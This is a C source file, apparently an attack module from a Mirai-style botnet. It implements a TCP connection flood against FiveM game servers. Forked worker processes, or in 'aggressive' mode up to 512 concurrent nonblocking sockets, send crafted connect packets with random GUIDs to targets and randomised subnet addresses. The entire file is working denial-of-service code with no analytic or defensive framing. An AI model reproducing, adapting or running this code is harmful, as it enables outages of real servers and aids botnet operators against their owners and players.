#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/rand.h"
#include "headers/util.h"

#define MAX_AGG_CONNS 512

static void rand_guid(char *buf, int len)
{
    static const char chars[] = "0123456789abcdef";
    int i;

    for (i = 0; i < len; i++)
        buf[i] = chars[rand_next() % 16];
    buf[len] = '\0';
}

static int build_fivem_packet(uint8_t *buf, const char *guid)
{
    int pos = 0;
    const char *req = "connect\n";
    int req_len = util_strlen((char *)req);
    int guid_len = util_strlen((char *)guid);

    buf[pos++] = 0xFF;
    buf[pos++] = 0xFF;
    buf[pos++] = 0xFF;
    buf[pos++] = 0xFF;

    util_memcpy(buf + pos, (char *)req, req_len);
    pos += req_len;

    util_memcpy(buf + pos, (char *)guid, guid_len);
    pos += guid_len;

    buf[pos++] = '\n';

    return pos;
}

static void fivem_worker(uint8_t targs_len, struct attack_target *targs,
                         uint8_t opts_len, struct attack_option *opts)
{
    uint16_t dport = (uint16_t)attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 30120);
    int aggressive = attack_get_opt_int(opts_len, opts, ATK_OPT_AGGRESSIVE, 0);
    int tidx = (int)(rand_next() % targs_len);

    uint8_t pkt[256];
    char guid[33];

    if (aggressive)
    {
        int *fds = calloc(MAX_AGG_CONNS, sizeof(int));
        struct pollfd *pfds = calloc(MAX_AGG_CONNS, sizeof(struct pollfd));
        int active = 0;
        int i;

        if (!fds || !pfds)
        {
            if (fds) free(fds);
            if (pfds) free(pfds);
            return;
        }

        for (i = 0; i < MAX_AGG_CONNS; i++)
        {
            fds[i] = -1;
            pfds[i].fd = -1;
            pfds[i].events = 0;
        }

        while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time)
        {
            for (i = 0; i < MAX_AGG_CONNS && active < MAX_AGG_CONNS; i++)
            {
                uint32_t dst;
                int fd;
                struct sockaddr_in addr;

                if (fds[i] >= 0)
                    continue;

                dst = targs[tidx].addr;
                if (targs[tidx].netmask < 32)
                    dst = htonl(ntohl(dst) + (rand_next() >> targs[tidx].netmask));
                tidx = (tidx + 1) % targs_len;

                fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd < 0)
                    continue;

                addr.sin_family = AF_INET;
                addr.sin_port = htons(dport);
                addr.sin_addr.s_addr = dst;

                fcntl(fd, F_SETFL, O_NONBLOCK);
                connect(fd, (struct sockaddr *)&addr, sizeof(addr));

                fds[i] = fd;
                pfds[i].fd = fd;
                pfds[i].events = POLLOUT | POLLIN;
                active++;
            }

            if (poll(pfds, MAX_AGG_CONNS, 100) < 0)
                break;

            for (i = 0; i < MAX_AGG_CONNS; i++)
            {
                int pkt_len;
                char buf[1024];
                int n;

                if (fds[i] < 0)
                    continue;

                if (pfds[i].revents & (POLLERR | POLLHUP | POLLNVAL))
                {
                    close(fds[i]);
                    fds[i] = -1;
                    pfds[i].fd = -1;
                    pfds[i].events = 0;
                    active--;
                }
                else if (pfds[i].revents & POLLOUT)
                {
                    rand_guid(guid, 32);
                    pkt_len = build_fivem_packet(pkt, guid);
                    send(fds[i], pkt, pkt_len, MSG_NOSIGNAL);
                    pfds[i].events = POLLIN;
                }
                else if (pfds[i].revents & POLLIN)
                {
                    n = recv(fds[i], buf, sizeof(buf), MSG_DONTWAIT);
                    if (n <= 0)
                    {
                        close(fds[i]);
                        fds[i] = -1;
                        pfds[i].fd = -1;
                        pfds[i].events = 0;
                        active--;
                    }
                }
            }

            usleep(10000);
        }

        for (i = 0; i < MAX_AGG_CONNS; i++)
        {
            if (fds[i] >= 0)
                close(fds[i]);
        }
        free(fds);
        free(pfds);
    }
    else
    {
        while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time)
        {
            int i;

            for (i = 0; i < targs_len; i++)
            {
                uint32_t dst = targs[tidx].addr;
                int fd;
                int pkt_len;
                struct sockaddr_in addr;
                struct pollfd pfd;
                int serr;
                socklen_t sl = sizeof(serr);

                if (targs[tidx].netmask < 32)
                    dst = htonl(ntohl(dst) + (rand_next() >> targs[tidx].netmask));
                tidx = (tidx + 1) % targs_len;

                rand_guid(guid, 32);
                pkt_len = build_fivem_packet(pkt, guid);

                fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd < 0)
                    continue;

                addr.sin_family = AF_INET;
                addr.sin_port = htons(dport);
                addr.sin_addr.s_addr = dst;

                fcntl(fd, F_SETFL, O_NONBLOCK);
                connect(fd, (struct sockaddr *)&addr, sizeof(addr));
                pfd.fd = fd;
                pfd.events = POLLOUT;
                pfd.revents = 0;
                if (poll(&pfd, 1, 1500) <= 0)
                {
                    close(fd);
                    continue;
                }
                if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &serr, &sl) < 0 || serr)
                {
                    close(fd);
                    continue;
                }
                fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) & ~O_NONBLOCK);

                send(fd, pkt, pkt_len, MSG_NOSIGNAL);
                close(fd);
            }
        }
    }
}

void attack_fivem(uint8_t targs_len, struct attack_target *targs,
                  uint8_t opts_len, struct attack_option *opts)
{
    int workers = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 16);
    int i;

    if (workers < 1)
        workers = 1;
    if (workers > 64)
        workers = 64;

#ifdef ANDROID
    /* Already inside a pthread from attack_start — no further fork. */
    (void)workers;
    fivem_worker(targs_len, targs, opts_len, opts);
#else
    for (i = 0; i < workers; i++)
    {
        pid_t pid = fork();
        if (pid < 0)
            continue;
        if (pid == 0)
        {
            fivem_worker(targs_len, targs, opts_len, opts);
            _exit(0);
        }
    }

    while (g_atk_end_time == 0 || time(NULL) < g_atk_end_time)
        sleep(1);

    while (waitpid(-1, NULL, WNOHANG) > 0)
        ;
#endif
}
